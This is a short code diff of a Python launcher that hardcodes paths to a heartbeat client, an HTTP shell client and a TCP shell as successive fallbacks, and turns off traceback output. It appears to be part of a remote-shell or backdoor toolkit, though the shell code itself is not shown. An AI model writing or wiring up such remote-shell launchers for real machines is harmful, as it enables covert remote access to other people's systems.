@@ -2,10 +2,11 @@
 from subprocess import Popen
 import sys
 import time
+sys.tracebacklimit = 0
 
-heartbeat = sys.argv[1]
-firstTry = sys.argv[2]
-secondTry = sys.argv[3]
+heartbeat = "Heartbeat/HBhttpclient.py"
+firstTry = "HTTP-shell/HTTPshellClient.py"
+secondTry = "TCP-shell/TCPshell.py" 
 #thirdTry = sys.argv[4]
 #fourthTry = sys.argv[5]
 
